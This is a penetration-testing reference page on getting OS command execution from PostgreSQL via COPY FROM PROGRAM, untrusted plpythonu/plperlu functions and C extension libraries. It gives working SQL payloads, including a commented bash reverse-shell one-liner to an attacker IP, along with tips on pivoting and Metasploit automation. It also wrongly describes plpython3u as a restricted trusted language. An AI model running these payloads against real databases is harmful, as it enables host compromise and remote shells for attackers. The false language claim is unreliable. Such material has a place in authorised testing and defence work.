---
title: "PostgreSQL command execution"
description: "Running operating-system commands from PostgreSQL as the service account through COPY FROM PROGRAM, untrusted procedural languages like plpythonu and plperlu, and loadable C extensions."
keywords:
  - COPY FROM PROGRAM
  - plpythonu
  - plperlu
  - CREATE FUNCTION
  - PostgreSQL RCE
---

# PostgreSQL command execution

As a superuser (or a role with `pg_execute_server_program`), PostgreSQL runs operating-system commands as its **service account**. `COPY ... FROM PROGRAM` is the direct route; untrusted languages and C extensions are the alternatives.

## COPY FROM PROGRAM

Since PostgreSQL 9.3 a superuser can pipe a program's output into a table, which simply runs the command:

```sql
CREATE TABLE cmd_out (line text);
COPY cmd_out FROM PROGRAM 'id';
SELECT * FROM cmd_out;
-- one-shot reverse shell: COPY cmd_out FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/<ip>/443 0>&1"';
```

## Untrusted procedural languages

If an **untrusted** language is available, its functions run unsandboxed:

```sql
CREATE OR REPLACE LANGUAGE plpythonu;   -- or plperlu
CREATE OR REPLACE FUNCTION exec(cmd text) RETURNS text AS $$
  import subprocess
  return subprocess.check_output(cmd, shell=True).decode()
$$ LANGUAGE plpythonu;
SELECT exec('id');
```

## C extension functions

A superuser can load a shared library and expose it as a function, the most powerful and the quietest where `COPY PROGRAM` is watched:

```sql
-- write a compiled .so via the file primitives, then:
CREATE FUNCTION sys(cstring) RETURNS int AS '/tmp/evil.so', 'sys' LANGUAGE C STRICT;
```

## Exploitation notes

- `COPY ... FROM PROGRAM` is the first thing to try as superuser: one statement, no extra objects to compile.
- Commands run as the **PostgreSQL service account** (`postgres` on most Linux hosts), so the payoff is host access as that user, often a pivot to further local escalation.
- `plpythonu`/`plperlu` must already be installed as *untrusted* variants; the trusted `plpython3u` is restricted.
- `pgsql_shell` (metasploit `postgres_payload`/`postgres_copy_from_program_cmd_exec`) automates the COPY path.

## Tools

- **psql**: run the statements directly.
- **Metasploit** (`postgres_copy_from_program_cmd_exec`, `postgres_payload`): automated COPY and payload execution.

## References

- [HackTricks: PostgreSQL RCE](https://hacktricks.wiki/en/network-services-pentesting/pentesting-postgresql.html)
- [PostgreSQL: COPY FROM PROGRAM](https://www.postgresql.org/docs/current/sql-copy.html)
- [PayloadsAllTheThings: PostgreSQL injection and RCE](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md)
